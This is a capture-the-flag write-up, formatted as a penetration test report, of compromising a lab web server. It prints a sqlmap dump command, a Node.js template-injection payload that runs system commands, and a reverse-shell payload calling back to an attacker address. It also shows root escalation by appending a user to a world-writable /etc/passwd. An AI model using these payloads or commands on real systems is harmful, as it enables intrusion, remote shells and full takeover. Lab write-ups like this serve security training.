# Web-Application-CTF-Penetration-Test-Report

# Web Application CTF Penetration Test Report

## Executive Summary

This report documents a comprehensive penetration test of a web application CTF challenge that resulted in complete system compromise through a chain of critical vulnerabilities. The assessment successfully exploited SQL injection, Server-Side Template Injection (SSTI), and system misconfiguration to achieve full root access.

**Target System:** `http://192.168.108.88`
**Assessment Type:** Black-box web application penetration testing
**Final Flag:** `VISIONET{rootflag}`
**Overall Risk:** **CRITICAL**

---

## Attack Chain Overview

The successful compromise followed this sophisticated attack path:
1. **Initial Reconnaissance** → Web application fingerprinting
2. **SQL Injection** → Database credential extraction  
3. **Authentication Bypass** → Administrative access
4. **Server-Side Template Injection** → Remote code execution
5. **Reverse Shell** → Interactive system access
6. **Privilege Escalation** → Root access via file permission exploit
7. **Flag Capture** → Mission accomplished

---

## Detailed Technical Analysis

### 1. Initial Reconnaissance

**Target:** `http://192.168.108.88`
**Method:** Black-box testing approach
**Objective:** Identify attack vectors and potential entry points

### 2. SQL Injection Discovery & Exploitation

**Vulnerability Location:** Parameter `?page=about`
**Tool Used:** SQLMap
**Risk Level:** **CRITICAL**

#### Exploitation Process:
```bash
sqlmap -u "http://192.168.108.88/?page=about" --dbs --dump
```

#### Database Enumeration Results:
- **DBMS:** MySQL
- **Database:** `db_landing`
- **Target Table:** `users`

#### Credential Extraction:
```sql
Database: db_landing
Table: users
+----------+----------------------------------+
| username | password                         |
+----------+----------------------------------+
| admin    | 72b302bf297a228a75730123efef7c41 |
+----------+----------------------------------+
```

#### Password Cracking:
- **Hash:** `72b302bf297a228a75730123efef7c41` (MD5)
- **Plaintext:** `banana`
- **Method:** Hash lookup/dictionary attack

**Impact:** Complete database compromise and administrative credential disclosure

### 3. Authentication Bypass

**Credentials:** `admin:banana`
**Access Level:** Administrative panel access
**Result:** ✅ Successful authentication

This provided access to administrative functionality and potential injection points.

### 4. Server-Side Template Injection (SSTI)

**Vulnerability Type:** SSTI leading to Remote Code Execution
**Risk Level:** **CRITICAL**

#### Initial Detection:
**Test Payload:**
```javascript
#{7*7}
```
**Response:** `49`
**Conclusion:** Template injection confirmed (likely Node.js/JavaScript)

#### Command Execution Proof of Concept:
**Payload:**
```javascript
#{this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id').toString()}
```

**Response:**
```bash
uid=1001(jane) gid=1001(jane) groups=1001(jane)
```

**Impact:** Confirmed remote code execution as user `jane`

### 5. Reverse Shell Establishment

#### Attacker Setup:
```bash
# Kali Linux - Listener
nc -lvnp 4444
```

#### SSTI Reverse Shell Payload:
```javascript
#{this.constructor.constructor('return process')().mainModule.require('child_process').exec("bash -c 'bash -i >& /dev/tcp/192.168.108.85/4444 0>&1 &'")}
```

#### Result:
```bash
jane@ubuntu:~$ whoami
jane
jane@ubuntu:~$ id
uid=1001(jane) gid=1001(jane) groups=1001(jane)
```

**Status:** ✅ Interactive shell established

### 6. Privilege Escalation Analysis

#### File Permission Discovery:
```bash
jane@ubuntu:~$ ls -la /etc/passwd
-rw-rw-rw- 1 root root 1553 /etc/passwd
```

**Critical Finding:** `/etc/passwd` has world-writable permissions (666)

#### Exploitation Method:

**Step 1: Password Hash Generation**
```bash
# On attacker machine
openssl passwd 123
U80DPmebpqVtw
```

**Step 2: Malicious User Injection**
```bash
jane@ubuntu:~$ echo 'user3:U80DPmebpqVtw:0:0:root:/root:/bin/bash' >> /etc/passwd
```

**Step 3: Privilege Escalation**
```bash
jane@ubuntu:~$ su user3
Password: 123
root@ubuntu:~# id
uid=0(root) gid=0(root) groups=0(root)
```

**Result:** ✅ Root access achieved

### 7. Flag Capture

```bash
root@ubuntu:~# cat /root/root.txt
VISIONET{rootflag}
```

**Mission Status:** ✅ **COMPLETE**

---

## Vulnerability Assessment

### Critical Vulnerabilities Identified

| Vulnerability | Location | Risk Level | CVSS Score | Exploitability |
|---------------|----------|------------|------------|----------------|
| SQL Injection | `?page=about` | **CRITICAL** | 9.8 | High |
| Server-Side Template Injection | Admin Panel | **CRITICAL** | 9.8 | High |  
| World-writable /etc/passwd | System | **CRITICAL** | 9.8 | High |
| Weak Password Policy | Database | **HIGH** | 7.5 | Medium |

### Impact Analysis

#### Confidentiality Impact: **HIGH**
- Database contents fully exposed
- System files accessible
- Sensitive configuration data readable

#### Integrity Impact: **HIGH** 
- System user accounts modifiable
- Application data alterable
- System configuration changeable

#### Availability Impact: **HIGH**
- Potential system disruption
- Service manipulation possible
- Denial of service achievable

---

## Risk Assessment Matrix

### Business Impact

| Asset | Confidentiality | Integrity | Availability | Overall Risk |
|-------|----------------|-----------|--------------|--------------|
| Web Application | **CRITICAL** | **CRITICAL** | **HIGH** | **CRITICAL** |
| Database | **CRITICAL** | **CRITICAL** | **MEDIUM** | **CRITICAL** |
| Operating System | **CRITICAL** | **CRITICAL** | **HIGH** | **CRITICAL** |

### Attack Complexity vs Impact

```
High Impact    │ ██ SSTI RCE     │ █ SQL Injection │
               │                 │                 │
Medium Impact  │                 │                 │
               │                 │                 │
Low Impact     │                 │                 │
               └─────────────────┼─────────────────┘
                Low Complexity    High Complexity
```

---
## Security Testing Methodology

### Tools & Techniques Used

#### Reconnaissance Phase
- **Manual browsing** - Application functionality mapping
- **Parameter discovery** - Injection point identification

#### Exploitation Phase  
- **SQLMap** - Automated SQL injection exploitation
- **Manual SSTI testing** - Template injection verification
- **Netcat** - Reverse shell listener
- **OpenSSL** - Password hash generation

#### Post-Exploitation Phase
- **Linux enumeration** - Privilege escalation vectors
- **File permission analysis** - Misconfiguration discovery

This penetration test revealed a critical security posture with multiple high-impact vulnerabilities that allowed for complete system compromise. The combination of SQL injection, SSTI, and system misconfiguration created a perfect storm for attackers.

### Key Findings Summary:
- **3 Critical vulnerabilities** leading to full compromise
- **Multiple attack vectors** available to threat actors
- **Insufficient input validation** across the application
- **System hardening gaps** enabling privilege escalation

### Success Metrics:
✅ **Administrative access** - Achieved via SQL injection  
✅ **Code execution** - Accomplished through SSTI  
✅ **System shell** - Established via reverse shell  
✅ **Root privileges** - Obtained through file permission exploit  
✅ **Flag capture** - `VISIONET{rootflag}` successfully retrieved

### Immediate Risk Mitigation Priority:
1. **Fix /etc/passwd permissions** (chmod 644)
2. **Patch SQL injection** vulnerability  
3. **Implement SSTI protection**
4. **Deploy monitoring solutions**

The successful exploitation demonstrates the critical importance of defense-in-depth strategies and regular security assessments. Immediate remediation of identified vulnerabilities is essential to prevent real-world exploitation.

**Assessment Status:** ✅ **OBJECTIVES COMPLETED**
**System Compromise Level:** **TOTAL (Root Access Achieved)**
